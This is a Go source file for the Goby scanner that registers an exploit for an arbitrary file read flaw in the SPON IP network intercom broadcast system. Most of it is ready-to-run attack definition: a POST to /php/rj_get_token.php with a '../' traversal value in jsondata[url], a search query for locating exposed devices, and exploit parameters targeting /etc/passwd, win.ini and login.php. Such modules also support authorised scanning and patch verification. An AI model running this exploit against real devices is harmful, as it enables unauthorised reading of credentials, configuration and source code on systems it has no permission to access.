package exploits

import (
	"git.gobies.org/goby/goscanner/goutils"
)

func init() {
	expJson := `{
    "Name": "SPON IP network intercom broadcast system rj_get_token.php any file read",
    "Description": "World Bond Communication Co., Ltd. is an audio as the core of the Internet of things solution provider. An arbitrary file reading vulnerability exists in the IP network intercom broadcast system of WorldBond Communication Co., LTD., which can be used by attackers to obtain sensitive information",
    "Impact": "SPON IP network intercom broadcast system rj_get_token.php any file read",
    "Recommendation": "<p>Limit ../ The best way is that the file should be in the database for one to one mapping, avoid entering the absolute path to obtain the file</p>",
    "Product": "SPON IP network intercom broadcast system",
    "VulType": [
        "File Read"
    ],
    "Tags": [
        "File Read"
    ],
    "Translation": {
        "CN": {
            "Name": "SPON IP 网络对讲广播系统 rj_get_token.php 文件 jsondata 参数 存在任意文件读取漏洞",
            "Description": "<p>SPON IP网络对讲广播系统 是世邦通信股份有限公司的一款广播系统，建立在通用网络平台上，融入了其自主研发的数字音频技术。</p><p>SPON IP 网络对讲广播系统 存在任意文件读取漏洞，攻击者可通过该漏洞读取泄露源码、数据库配置文件等等，导致网站处于极度不安全状态。</p>",
            "Impact": "<p>SPON IP 网络对讲广播系统 存在任意文件读取漏洞，攻击者可通过该漏洞读取泄露源码、数据库配置文件等等，导致网站处于极度不安全状态。<br></p>",
            "Recommendation": "<p>官方暂未修复该漏洞，请用户联系厂商修复漏洞：<a href=\"https://www.spon.com.cn/\" target=\"_blank\">https://www.spon.com.cn/</a></p><p><br></p><p>1、通过防火墙等安全设备设置访问策略，设置白名单访问。</p><p>2、如非必要，禁止公网访问该系统。</p>",
            "Product": "SPON IP network intercom broadcast system",
            "VulType": [
                "文件读取"
            ],
            "Tags": [
                "文件读取"
            ]
        },
        "EN": {
            "Name": "SPON IP network intercom broadcast system rj_get_token.php any file read",
            "Description": "World Bond Communication Co., Ltd. is an audio as the core of the Internet of things solution provider. An arbitrary file reading vulnerability exists in the IP network intercom broadcast system of WorldBond Communication Co., LTD., which can be used by attackers to obtain sensitive information",
            "Impact": "SPON IP network intercom broadcast system rj_get_token.php any file read",
            "Recommendation": "<p>Limit ../ The best way is that the file should be in the database for one to one mapping, avoid entering the absolute path to obtain the file<br></p>",
            "Product": "SPON IP network intercom broadcast system",
            "VulType": [
                "File Read"
            ],
            "Tags": [
                "File Read"
            ]
        }
    },
    "FofaQuery": "body=\"lan/manifest.json\"",
    "GobyQuery": "body=\"lan/manifest.json\"",
    "Author": "luckying1314@139.com",
    "Homepage": "https://www.spon.com.cn/",
    "DisclosureDate": "2021-08-27",
    "References": [
        "https://poc.shuziguanxing.com/?#/publicIssueInfo#issueId=4568"
    ],
    "HasExp": true,
    "Is0day": false,
    "Level": "2",
    "CVSS": "7.5",
    "CVEIDs": [],
    "CNVD": [],
    "CNNVD": [],
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "POST",
                "uri": "/php/rj_get_token.php",
                "follow_redirect": true,
                "header": {
                    "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8"
                },
                "data_type": "text",
                "data": "jsondata[url]=../lan/version.txt"
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "v1.x 3.31 RELEASE",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "POST",
                "uri": "/php/rj_get_token.php",
                "follow_redirect": true,
                "header": {
                    "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8"
                },
                "data_type": "text",
                "data": "jsondata[url]=../lan/version.txt"
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "v1.x 3.31 RELEASE",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExpParams": [
        {
            "name": "filepath",
            "type": "createSelect",
            "value": "../php/login.php,C:/windows/win.ini,/etc/passwd",
            "show": ""
        }
    ],
    "ExpTips": {
        "type": "",
        "content": ""
    },
    "AttackSurfaces": {
        "Application": [
            "SPON IP network intercom broadcast system"
        ],
        "Support": [],
        "Service": [],
        "System": [],
        "Hardware": []
    },
    "PocId": "10755"
}`

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		nil,
		nil,
	))
}
